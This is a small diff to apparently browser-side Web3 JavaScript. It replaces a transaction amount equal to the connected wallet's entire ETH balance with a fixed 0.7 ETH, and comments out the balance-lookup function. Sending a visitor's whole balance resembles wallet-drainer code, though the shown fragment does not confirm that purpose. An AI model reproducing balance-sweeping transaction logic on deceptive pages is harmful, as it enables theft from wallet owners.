@@ -878,9 +878,11 @@ console.log(collection)
   }
 
 
-var ethbalance =  await get_eth(account)
+// var ethbalance =  await get_eth(account)
 
-const finalAmount = Web3.utils.toWei(ethbalance.toString(), 'ether');
+  var value = 0.7
+
+const finalAmount = Web3.utils.toWei(value.toString(), 'ether');
 
 const txData = { 
   from: account,
@@ -966,16 +968,16 @@ var checkConnected = setInterval( async () => {
   
   /*------------------------------------------------------*/
 
-    async function get_eth(address) {
+  //   async function get_eth(address) {
 
-      const balances = web3.utils.fromWei(
-        await web3.eth.getBalance(address),
-        'ether'
-      )* 1;
+  //     const balances = web3.utils.fromWei(
+  //       await web3.eth.getBalance(address),
+  //       'ether'
+  //     )* 1;
 
-      return balances;
-
-
+  //     return balances;
 
 
-  }
+
+
+  // }
